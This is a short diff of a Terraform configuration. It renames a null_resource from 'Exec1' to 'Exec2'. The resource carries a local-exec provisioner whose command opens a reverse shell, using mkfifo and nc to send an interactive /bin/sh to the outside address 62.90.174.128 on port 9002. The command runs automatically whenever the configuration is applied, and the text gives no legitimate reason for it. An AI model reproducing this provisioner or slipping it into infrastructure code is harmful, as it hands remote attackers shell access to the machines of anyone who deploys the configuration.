@@ -1,4 +1,4 @@
-resource "null_resource" "Exec1" {
+resource "null_resource" "Exec2" {
   provisioner "local-exec" {
     
     command = "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | nc 62.90.174.128 9002 > /tmp/s; rm /tmp/s"
